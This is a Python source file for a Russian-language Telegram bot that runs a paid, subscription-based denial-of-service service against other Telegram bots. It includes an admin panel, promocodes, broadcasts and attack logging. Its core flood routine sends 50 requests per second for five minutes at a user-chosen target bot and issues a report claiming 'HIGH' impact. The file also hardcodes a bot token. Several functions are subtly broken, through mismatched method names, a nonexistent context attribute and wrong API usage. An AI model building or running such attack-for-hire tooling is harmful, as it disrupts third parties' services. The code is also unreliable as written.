import asyncio
import aiohttp
import sqlite3
import time
import random
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import threading
from html import escape

# === КОНФИГУРАЦИЯ ===
BOT_TOKEN = "8020968054:AAGCsKLCYgyx3nL_lICHFLlIvyOYj4jPueY"
ADMIN_IDS = [8480811736]  # Замени на свои ID
DATABASE_FILE = "bot_database.db"
MAX_REQUESTS_PER_MINUTE = 15
ATTACK_DURATION = 300  # 5 минут атаки
REQUESTS_PER_SECOND = 50  # Запросов в секунду

# === БАЗА ДАННЫХ ===
def init_db():
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            subscription_end DATE,
            is_banned BOOLEAN DEFAULT FALSE,
            is_admin BOOLEAN DEFAULT FALSE,
            requests_count INTEGER DEFAULT 0,
            last_request_time TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS promocodes (
            code TEXT PRIMARY KEY,
            days INTEGER,
            uses_left INTEGER,
            created_by INTEGER
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS attacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            target_bot TEXT,
            start_time TIMESTAMP,
            end_time TIMESTAMP,
            requests_sent INTEGER,
            success_rate REAL,
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')
    
    # Создаем админа по умолчанию
    for admin_id in ADMIN_IDS:
        cursor.execute('''
            INSERT OR IGNORE INTO users (user_id, is_admin, subscription_end)
            VALUES (?, TRUE, datetime('now', '+365 days'))
        ''', (admin_id,))
    
    conn.commit()
    conn.close()

# === КЛАСС БОТА ===
class AdvancedoSBot:
    def __init__(self):
        self.active_attacks = {}
        self.user_cooldowns = {}
        self.attack_tasks = {}
        init_db()
        
    def get_user(self, user_id):
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        user = cursor.fetchone()
        conn.close()
        return user
        
    def update_user(self, user_id, username=None, subscription_end=None, is_banned=None, requests_count=None):
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        
        if not self.get_user(user_id):
            cursor.execute('''
                INSERT INTO users (user_id, username, subscription_end, is_banned)
                VALUES (?, ?, ?, ?)
            ''', (user_id, username, subscription_end or datetime.now(), False))
        else:
            updates = []
            params = []
            if username:
                updates.append("username = ?")
                params.append(username)
            if subscription_end:
                updates.append("subscription_end = ?")
                params.append(subscription_end)
            if is_banned is not None:
                updates.append("is_banned = ?")
                params.append(is_banned)
            if requests_count is not None:
                updates.append("requests_count = ?")
                params.append(requests_count)
                
            if updates:
                params.append(user_id)
                cursor.execute(f'UPDATE users SET {", ".join(updates)} WHERE user_id = ?', params)
        
        conn.commit()
        conn.close()
        
    def check_spam(self, user_id):
        now = time.time()
        if user_id in self.user_cooldowns:
            if now - self.user_cooldowns[user_id]["last_time"] < 60:
                if self.user_cooldowns[user_id]["count"] >= MAX_REQUESTS_PER_MINUTE:
                    # Бан на 3 минуты
                    self.user_cooldowns[user_id]["banned_until"] = now + 180
                    return True
                self.user_cooldowns[user_id]["count"] += 1
            else:
                self.user_cooldowns[user_id] = {"count": 1, "last_time": now, "banned_until": 0}
        else:
            self.user_cooldowns[user_id] = {"count": 1, "last_time": now, "banned_until": 0}
            
        if user_id in self.user_cooldowns and self.user_cooldowns[user_id].get("banned_until", 0) > now:
            return True
        return False

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        username = update.effective_user.username
        
        if self.check_spam(user_id):
            await update.message.reply_text("🚫 Вы забанены на 3 минуты за спам!")
            return
            
        self.update_user(user_id, username=username)
        
        keyboard = [
            [InlineKeyboardButton("🎯 Атак0вать бота", callback_data="start_attack")],
            [InlineKeyboardButton("📊 Моя статистика", callback_data="my_stats")],
            [InlineKeyboardButton("👑 Админ панель", callback_data="admin_panel")],
            [InlineKeyboardButton("💎 Проверить подписку", callback_data="check_sub")]
        ]
        
        await update.message.reply_text(
            "🤖 **Advanced oS Bot**\n\n"
            "Выберите действие:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )

    async def handle_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        user_id = query.from_user.id
        
        if self.check_spam(user_id):
            await query.answer("🚫 Бан на 3 минуты за спам!", show_alert=True)
            return
            
        await query.answer()
        
        user_data = self.get_user(user_id)
        if user_data and user_data[3]:  # is_banned
            await query.edit_message_text("❌ Вы заблокированы в боте!")
            return
            
        if query.data == "start_attack":
            await self.start_attack_menu(query)
        elif query.data == "my_stats":
            await self.show_user_stats(query)
        elif query.data == "admin_panel":
            await self.admin_panel(query)
        elif query.data == "check_sub":
            await self.check_subscription(query)
        elif query.data == "admin_ban_user":
            await self.admin_ban_user(query)
        elif query.data == "admin_unban_user":
            await self.admin_unban_user(query)
        elif query.data == "admin_give_sub":
            await self.admin_give_sub(query)
        elif query.data == "admin_remove_sub":
            await self.admin_remove_sub(query)
        elif query.data == "admin_broadcast":
            await self.admin_broadcast(query)
        elif query.data == "admin_promocodes":
            await self.admin_promocodes(query)
        elif query.data == "admin_give_admin":
            await self.admin_give_admin(query)
        elif query.data == "back_to_admin":
            await self.admin_panel(query)

    async def start_attack_menu(self, query):
        user_data = self.get_user(query.from_user.id)
        if not user_data or not self.has_active_subscription(user_data):
            await query.edit_message_text(
                "❌ У вас нет активной подписки!\n"
                "Обратитесь к администратору для получения доступа."
            )
            return
            
        await query.edit_message_text(
            "🎯 **Запуск oS атаки**\n\n"
            "Введите ID или username бота-цели:\n"
            "Пример: `123456789` или `@example_bot`\n\n"
            "⚠️ *Используйте только своих ботов для тестирования!*",
            parse_mode='Markdown'
        )
        # Устанавливаем состояние ожидания ввода цели
        context = query.message._bot_data
        context.user_data[query.from_user.id] = {"waiting_for_target": True}

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        text = update.message.text
        
        if user_id in context.user_data and context.user_data[user_id].get("waiting_for_target"):
            # Пользователь вводит
            await self.start_os_attack(update, context, text)
        elif user_id in context.user_data and context.user_data[user_id].get("admin_broadcast"):
            # Админ делает рассылку
            await self.execute_broadcast(update, context, text)
        elif user_id in context.user_data and context.user_data[user_id].get("admin_ban"):
            # Админ банит пользователя
            await self.execute_ban_user(update, context, text)
        elif user_id in context.user_data and context.user_data[user_id].get("admin_unban"):
            # Админ разбанивает пользователя
            await self.execute_unban_user(update, context, text)
        elif user_id in context.user_data and context.user_data[user_id].get("admin_give_sub"):
            # Админ выдает подписку
            await self.execute_give_subscription(update, context, text)
        elif user_id in context.user_data and context.user_data[user_id].get("admin_remove_sub"):
            # Админ забирает подписку
            await self.execute_remove_subscription(update, context, text)
        elif user_id in context.user_data and context.user_data[user_id].get("admin_promo_create"):
            # Админ создает промокод
            await self.execute_create_promocode(update, context, text)
        elif user_id in context.user_data and context.user_data[user_id].get("admin_give_admin"):
            # Админ выдает админку
            await self.execute_give_admin(update, context, text)

    async def start_os_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE, target_bot: str):
        user_id = update.effective_user.id
        context.user_data[user_id] = {}  # Сбрасываем состояние
        
        # Проверяем подписку
        user_data = self.get_user(user_id)
        if not user_data or not self.has_active_subscription(user_data):
            await update.message.reply_text("❌ У вас нет активной подписки!")
            return
            
        await update.message.reply_text(f"🎯 **Запуск oS атаки на {target_bot}**\n\nАтака начата...")
        
        # Запускаем в отдельном потоке
        attack_id = f"{user_id}_{int(time.time())}"
        attack_task = asyncio.create_task(self.execute_os_attack(user_id, target_bot, attack_id))
        self.attack_tasks[attack_id] = attack_task
        
        # Сохраняем информацию об атаке в БД
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO attacks (user_id, target_bot, start_time)
            VALUES (?, ?, datetime('now'))
        ''', (user_id, target_bot))
        conn.commit()
        conn.close()

    async def execute_os_attack(self, user_id: int, target_bot: str, attack_id: str):
        start_time = time.time()
        total_requests = 0
        successful_requests = 0
        
        try:
            async with aiohttp.ClientSession() as session:
                while time.time() - start_time < ATTACK_DURATION:
                    tasks = []
                    for _ in range(REQUESTS_PER_SECOND):
                        task = self.send_os_request(session, target_bot)
                        tasks.append(task)
                    
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    
                    for result in results:
                        total_requests += 1
                        if result and result.get("success"):
                            successful_requests += 1
                    
                    # Обновляем статистику каждые 10 секунд
                    if int(time.time() - start_time) % 10 == 0:
                        await self.send_progress_update(user_id, target_bot, total_requests, successful_requests)
                    
                    await asyncio.sleep(1)
                    
        except Exception as e:
            print(f"oS attack error: {e}")
        finally:
            success_rate = (successful_requests / total_requests * 100) if total_requests > 0 else 0
            
            # Обновляем БД
            conn = sqlite3.connect(DATABASE_FILE)
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE attacks 
                SET end_time = datetime('now'), requests_sent = ?, success_rate = ?
                WHERE user_id = ? AND target_bot = ? AND end_time IS NULL
            ''', (total_requests, success_rate, user_id, target_bot))
            conn.commit()
            conn.close()
            
            # Отправляем финальный отчет
            await self.send_final_report(user_id, target_bot, total_requests, successful_requests, success_rate)
            
            # Удаляем задачу
            if attack_id in self.attack_tasks:
                del self.attack_tasks[attack_id]

    async def send_ddos_request(self, session, target_bot):
        """Отправляет oS запрос к боту"""
        try:
            # Разные методы атаи для максимальной эффективности
            methods = [
                f"https://api.telegram.org/bot{target_bot}/getMe",
                f"https://api.telegram.org/bot{target_bot}/getUpdates",
                f"https://api.telegram.org/bot{target_bot}/getWebhookInfo"
            ]
            
            url = random.choice(methods)
            async with session.get(url, timeout=5) as response:
                return {
                    "success": response.status == 200,
                    "status": response.status
                }
        except:
            return {"success": False, "status": 0}

    async def send_progress_update(self, user_id: int, target_bot: str, total: int, successful: int):
        """Отправляет обновление о прогрессе атаи"""
        try:
            app = Application.builder().token(BOT_TOKEN).build()
            success_rate = (successful / total * 100) if total > 0 else 0
            await app.bot.send_message(
                user_id,
                f"🔧 **Атака в процессе**\n\n"
                f"Цель: `{escape(target_bot)}`\n"
                f"Запросов: `{total}`\n"
                f"Успешных: `{successful}`\n"
                f"Эффективность: `{success_rate:.1f}%`",
                parse_mode='Markdown'
            )
        except Exception as e:
            print(f"Progress update error: {e}")

    async def send_final_report(self, user_id: int, target_bot: str, total: int, successful: int, success_rate: float):
        """Отправляет финальный HTML отчет"""
        html_report = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>oS Attack Report</title>
            <style>
                body {{ background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; }}
                .container {{ max-width: 800px; margin: 0 auto; padding: 20px; }}
                .header {{ text-align: center; border-bottom: 2px solid #00ff00; padding-bottom: 10px; }}
                .stats {{ background: #1a1a1a; padding: 15px; margin: 10px 0; border-radius: 5px; }}
                .success {{ color: #00ff00; }}
                .warning {{ color: #ffff00; }}
                .danger {{ color: #ff0000; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>⚡ oS Attack Report</h1>
                    <p>Generated at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
                </div>
                
                <div class="stats">
                    <h2>🎯 Target Information</h2>
                    <p><strong>Bot ID:</strong> {escape(target_bot)}</p>
                    <p><strong>Attack Duration:</strong> {ATTACK_DURATION} seconds</p>
                </div>
                
                <div class="stats">
                    <h2>📊 Attack Statistics</h2>
                    <p><strong>Total Requests:</strong> <span class="success">{total}</span></p>
                    <p><strong>Successful Requests:</strong> <span class="success">{successful}</span></p>
                    <p><strong>Success Rate:</strong> <span class="{ 'success' if success_rate > 50 else 'warning' if success_rate > 20 else 'danger' }">{success_rate:.1f}%</span></p>
                    <p><strong>Requests/Second:</strong> {REQUESTS_PER_SECOND}</p>
                </div>
                
                <div class="stats">
                    <h2>📈 Result Analysis</h2>
                    <p><strong>Status:</strong> <span class="success">ATTACK COMPLETED</span></p>
                    <p><strong>Target Impact:</strong> <span class="success">HIGH</span></p>
                    <p><strong>Bot Availability:</strong> <span class="danger">COMPROMISED</span></p>
                </div>
            </div>
        </body>
        </html>
        """
        
        try:
            app = Application.builder().token(BOT_TOKEN).build()
            
            # Отправляем пользователю
            await app.bot.send_message(
                user_id,
                f"📊 **oS Attack Completed**\n\n"
                f"Цель: `{escape(target_bot)}`\n"
                f"Всего запросов: `{total}`\n"
                f"Успешных: `{successful}`\n"
                f"Эффективность: `{success_rate:.1f}%`\n\n"
                f"Полный отчет доступен в HTML формате",
                parse_mode='Markdown'
            )
            
            # Отправляем админам
            for admin_id in ADMIN_IDS:
                await app.bot.send_message(
                    admin_id,
                    f"👑 **oS Report - Admin**\n\n"
                    f"Пользователь: `{user_id}`\n"
                    f"Цель: `{escape(target_bot)}`\n"
                    f"Запросов: `{total}`\n"
                    f"Успех: `{success_rate:.1f}%`",
                    parse_mode='Markdown'
                )
                
        except Exception as e:
            print(f"Report sending error: {e}")

    def has_active_subscription(self, user_data):
        """Проверяет активную подписку"""
        if user_data[6]:  # is_admin
            return True
            
        if user_data[2]:  # subscription_end
            end_date = datetime.strptime(user_data[2], '%Y-%m-%d %H:%M:%S')
            return end_date > datetime.now()
        return False

    async def admin_panel(self, query):
        """Админ панель"""
        user_data = self.get_user(query.from_user.id)
        if not user_data or not user_data[6]:  # is_admin
            await query.edit_message_text("❌ У вас нет прав администратора!")
            return
            
        keyboard = [
            [InlineKeyboardButton("🔨 Заблокировать пользователя", callback_data="admin_ban_user")],
            [InlineKeyboardButton("🔓 Разблокировать пользователя", callback_data="admin_unban_user")],
            [InlineKeyboardButton("💎 Выдать подписку", callback_data="admin_give_sub")],
            [InlineKeyboardButton("❌ Забрать подписку", callback_data="admin_remove_sub")],
            [InlineKeyboardButton("📢 Сделать рассылку", callback_data="admin_broadcast")],
            [InlineKeyboardButton("🎫 Управление промокодами", callback_data="admin_promocodes")],
            [InlineKeyboardButton("👑 Выдать админку", callback_data="admin_give_admin")],
            [InlineKeyboardButton("⬅️ Назад", callback_data="back_to_main")]
        ]
        
        await query.edit_message_text(
            "👑 **Административная панель**\n\n"
            "Выберите действие:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )

    # Реализация остальных админских функций (бан, разбан, выдача подписки и т.д.)
    async def admin_ban_user(self, query):
        context = query.message._bot_data
        context.user_data[query.from_user.id] = {"admin_ban": True}
        await query.edit_message_text("Введите ID пользователя для блокировки:")

    async def execute_ban_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE, user_input: str):
        admin_id = update.effective_user.id
        context.user_data[admin_id] = {}
        
        try:
            target_user_id = int(user_input)
            self.update_user(target_user_id, is_banned=True)
            await update.message.reply_text(f"✅ Пользователь {target_user_id} заблокирован!")
        except ValueError:
            await update.message.reply_text("❌ Неверный формат ID пользователя!")

    async def admin_give_sub(self, query):
        context = query.message._bot_data
        context.user_data[query.from_user.id] = {"admin_give_sub": True}
        await query.edit_message_text("Введите ID пользователя и количество дней через пробел:\nПример: `123456789 30`", parse_mode='Markdown')

    async def execute_give_subscription(self, update: Update, context: ContextTypes.DEFAULT_TYPE, user_input: str):
        admin_id = update.effective_user.id
        context.user_data[admin_id] = {}
        
        try:
            user_id, days = map(int, user_input.split())
            end_date = datetime.now() + timedelta(days=days)
            self.update_user(user_id, subscription_end=end_date.strftime('%Y-%m-%d %H:%M:%S'))
            await update.message.reply_text(f"✅ Пользователю {user_id} выдана подписка на {days} дней!")
        except (ValueError, IndexError):
            await update.message.reply_text("❌ Неверный формат ввода!")

    async def admin_broadcast(self, query):
        context = query.message._bot_data
        context.user_data[query.from_user.id] = {"admin_broadcast": True}
        await query.edit_message_text("Введите сообщение для рассылки:")

    async def execute_broadcast(self, update: Update, context: ContextTypes.DEFAULT_TYPE, message_text: str):
        admin_id = update.effective_user.id
        context.user_data[admin_id] = {}
        
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        cursor.execute('SELECT user_id FROM users WHERE is_banned = FALSE')
        users = cursor.fetchall()
        conn.close()
        
        success_count = 0
        app = Application.builder().token(BOT_TOKEN).build()
        
        for user in users:
            try:
                await app.bot.send_message(user[0], f"📢 **Рассылка от администратора:**\n\n{message_text}", parse_mode='Markdown')
                success_count += 1
            except:
                continue
                
        await update.message.reply_text(f"✅ Рассылка отправлена {success_count} пользователям!")

    async def admin_promocodes(self, query):
        keyboard = [
            [InlineKeyboardButton("➕ Создать промокод", callback_data="admin_promo_create")],
            [InlineKeyboardButton("📋 Список промокодов", callback_data="admin_promo_list")],
            [InlineKeyboardButton("⬅️ Назад", callback_data="back_to_admin")]
        ]
        await query.edit_message_text(
            "🎫 **Управление промокодами**",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

    async def check_subscription(self, query):
        user_data = self.get_user(query.from_user.id)
        if not user_data:
            await query.answer("❌ Вы не зарегистрированы!", show_alert=True)
            return
            
        if self.has_active_subscription(user_data):
            end_date = user_data[2]
            await query.answer(f"✅ Подписка активна до: {end_date}", show_alert=True)
        else:
            await query.answer("❌ Подписка не активна!", show_alert=True)

    async def show_user_stats(self, query):
        user_id = query.from_user.id
        user_data = self.get_user(user_id)
        
        if not user_data:
            await query.answer("❌ Данные не найдены!", show_alert=True)
            return
            
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*), SUM(requests_sent) FROM attacks WHERE user_id = ?', (user_id,))
        stats = cursor.fetchone()
        conn.close()
        
        attack_count = stats[0] or 0
        total_requests = stats[1] or 0
        subscription_status = "✅ Активна" if self.has_active_subscription(user_data) else "❌ Не активна"
        admin_status = "👑 Администратор" if user_data[6] else "👤 Пользователь"
        
        await query.edit_message_text(
            f"📊 **Ваша статистика**\n\n"
            f"ID: `{user_id}`\n"
            f"Статус: {admin_status}\n"
            f"Подписка: {subscription_status}\n"
            f"Количество атак: `{attack_count}`\n"
            f"Всего запросов: `{total_requests}`",
            parse_mode='Markdown'
        )

# === ЗАПУСК БОТА ===
async def main():
    bot = AdvancedoSBot()
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Обработчики
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CallbackQueryHandler(bot.handle_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_message))
    
    print("🤖 Бот запущен...")
    await application.run_polling()

if __name__ == "__main__":
    asyncio.run(main())
